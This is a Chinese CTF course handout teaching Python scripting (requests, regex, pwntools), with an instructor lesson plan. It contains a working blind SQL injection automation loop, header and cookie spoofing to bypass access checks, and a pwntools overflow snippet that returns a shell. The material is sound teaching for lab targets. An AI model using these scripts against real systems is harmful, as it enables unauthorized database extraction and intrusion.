# 🐍 CTF Python 速成与脚本化

> CTF 定向 Python：不系统学语言，只教做题用得到的 20%——写脚本自动化手工操作。对应课程 1.3。

---

## 一、🟢 环境与基础

```bash
# 建议直接用 Kali 自带 python3 + pip 换源
pip install requests pwntools gmpy2 pycryptodome
```

```python
# 语法最小集：变量/循环/字符串/文件——10 分钟能写题
flag = ''
for line in open('data.txt'):
    flag += line.strip()
print(len(flag))

# 类型转换三兄弟（CTF 高频）
int('0x41', 16)        # 65
chr(65)                # 'A'
ord('A')               # 65
bytes.fromhex('4141')  # b'AA'
b'AA'.hex()            # '4141'
```

---

## 二、🟢 requests——Web 自动化

```python
import requests

# GET / POST
r = requests.get('http://target.com/index.php?id=1')
r = requests.post('http://target.com/login', data={'user':'admin','pass':'123'})

# 带头/带 Cookie（CTF 高频：XFF、Referer、UA）
headers = {
    'X-Forwarded-For': '127.0.0.1',
    'User-Agent': 'Mozilla/5.0',
    'Cookie': 'admin=1'
}
r = requests.get(url, headers=headers)

print(r.status_code, r.headers, r.text)

# Session 保持（登录后操作）
s = requests.Session()
s.post(login_url, data=cred)
s.get(admin_url)
```

```python
# 经典：盲注自动化模板
import requests
url = 'http://target/?id=1'
result = ''
for i in range(1, 30):
    for c in range(32, 127):
        payload = f"1' and ascii(substr(database(),{i},1))={c}-- -"
        if 'exists' in requests.get(url + requests.utils.quote(payload)).text:
            result += chr(c); print(result); break
```

---

## 三、🟢 re 正则——从响应里抠 flag

```python
import re
text = requests.get(url).text
flag = re.findall(r'flag\{.*?\}', text)
print(flag)

# 常用模式速查
# .*?  非贪婪  \d 数字  [a-f0-9]{32}  (?:...)  不捕获组
# re.search  第一个   re.findall  全部
```

---

## 四、🟡 pwntools 初见（Pwn 方向预告）

```python
from pwn import *
context.log_level = 'debug'

p = process('./pwn')            # 本地
# p = remote('ip', port)        # 远程

p.sendline(b'A' * 40 + p64(0x401234))
p.recvuntil(b'input:')
print(p.recvline())
p.interactive()                 # 交互拿 shell

# 常用：p64/p32/u64/u32（打包）、cyclic(200)（偏移计算）、asm/shellcode
```

---

## 五、🟡 常用库速查（按方向）

| 库 | 用途 | 一行示例 |
|---|---|---|
| binascii | hex/字节转换 | `binascii.unhexlify('41')` |
| base64 | 编码解码 | `base64.b64decode(s)` |
| hashlib | md5/sha | `hashlib.md5(b'x').hexdigest()` |
| gmpy2 | 大数运算（Crypto） | `gmpy2.iroot(n,3)` 开 N 次方 |
| pycryptodome | AES/RSA | `Crypto.Cipher.AES` |
| PIL | 图片处理（隐写） | `Image.open('f.png')` |
| struct | 字节打包 | `struct.pack('<I', 1)` |
| zipfile | 压缩包 | `zipfile.ZipFile('f.zip')` |

---

## 六、🟡 脚本思维：把手工操作自动化

```text
判断标准：同一操作要重复 10 次以上 → 写脚本
写脚本三步：
1. 手工做一遍，记录每步输入输出
2. 把每步翻译成代码（requests/re/struct）
3. 加循环/条件（爆破、遍历、二分）

调试技巧：先 print 中间量再优化；远程失败先跑本地；
          网络题加 timeout 和重试；爆破加进度输出
```

---

## 七、练习题单

- 用 requests 独立解出任意一道 Web 盲注题（靶场）
- 用 re 从页面源码批量提取 20 个数字并求和（CTFHub 特训）
- 用 base64+binascii 解三层编码套娃
- pwntools 打通本地 ret2text（配合 PWN 篇 P2）
---

## 🎓 上课流程卡（1.3 · Python 速成 · 两课时 2×120 分钟）

> 给讲师：学员此时零编程基础的比例可能过半。本课的目标不是"学会 Python"，是"能改模板脚本"——所有练习都围绕"改"而不是"从零写"。

**教学目标**：下课时学员能①读懂并修改一个盲注脚本 ②用 requests+re 独立写出一个抓 flag 脚本 ③知道 pwntools 是什么。

**课前准备**：
- 发脚本包：4 个现成模板（requests 基础/盲注/re 提取/pwntools hello）——学员全程在模板上改
- 本地起一个练习 HTTP 服务（含简单 flag 页），保证断网也能实操

### 第一课时（120min）：requests + re

| 时间 | 环节 | 讲师动作 |
|---|---|---|
| 0-15 | 导入 | 现场演示：手工在浏览器点 50 次提交 vs 脚本 3 秒跑完——"今天教你让电脑替你重复劳动" |
| 15-45 | 讲解+跟打 | §二 requests：GET/POST/Cookie/Headers——**学员同步跟打**（每讲一个 API 学员跑一次，别连讲三个） |
| 45-60 | 讲解 | §三 re 正则：只教 findall + 三四个高频模式（.*?、\d、[a-f0-9]{32}） |
| 60-110 | 实操 | 任务阶梯：①改模板抓练习站首页标题 ②改 Cookie 过一道"仅管理员可见"题 ③综合：requests+re 抓 flag。巡场重点：缩进错误（新手第一杀手）、headers 字典拼写、编码报错（教 r.encoding） |
| 110-120 | 收口 | 展示下节课预告（pwntools）+ 作业：用脚本解一道 Web 题 |

### 第二课时（120min）：脚本思维 + pwntools 初见

| 时间 | 环节 | 讲师动作 |
|---|---|---|
| 0-15 | 导入 | 复盘作业 + 演示：把第一课时的脚本加上 for 循环 = 爆破器——"脚本思维就是找重复" |
| 15-45 | 讲解+演示 | §六 脚本思维三步法走一个完整例子（手工→翻译→加循环）；§四 pwntools：process/recv/sendline/interactive 四个词就够入门 |
| 45-110 | 实操 | 任务：①改盲注模板（换 URL/成功标志）跑通 ②pwntools 连本地测试程序拿输出。巡场重点：bytes 和 str 混用报错（`b'...'` 前缀是高频问题）、payload 拼接的 f-string 引号嵌套 |
| 110-120 | 收口 | 强调本课定位："不需要会写程序，需要会改程序"——后面每节课的实操都会用到这两个课时的新手三件（requests/re/pwntools） |

**学员常见卡点（预判）**：
1. 缩进/冒号报错 → 新手第一大坑，直接教"看报错最后一行的行号"
2. requests 返回 403/异常页面 → 大概率没带 UA/Cookie，回到 headers
3. pwntools recv 收不到 → 程序没输出提示符，教先 recvuntil 已知字符串
4. "我不会编程是不是学不了"→ 明说：本课程全程模板化，改参数就能用；想深入编程是加分项不是门槛

**被问倒的兜底**：学员问面向对象/装饰器等语言深度问题 → "CTF 脚本用不到，这问题等你写到需要时再学，现在挡路的是循环和字符串"。